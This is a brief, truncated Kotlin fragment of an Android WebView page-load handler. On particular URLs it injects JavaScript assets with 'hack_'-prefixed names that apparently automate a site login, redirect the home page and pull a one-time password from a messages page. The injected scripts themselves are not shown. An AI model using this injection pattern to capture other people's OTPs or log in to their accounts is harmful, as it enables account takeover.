    ...
    override fun onPageFinished(view: WebView?, url: String?) {
        when {
            url?.equals(URL_LANDING) == true -> {
                var loginJS = loadAssetTextAsString(context, "hack_fendi_login.js")
            ...
            url?.equals(URL_HOME) == true -> {
                val homeJS = loadAssetTextAsString(context, "hack_fendi_homeredirect.js")
                homeJS?.let {
                    view?.loadUrl(it)
                }
            }
            url?.contains(URL_MSGS) == true -> {
                var getOtpJS = loadAssetTextAsString(context, "hack_fendi_getotp.js")
                getOtpJS =
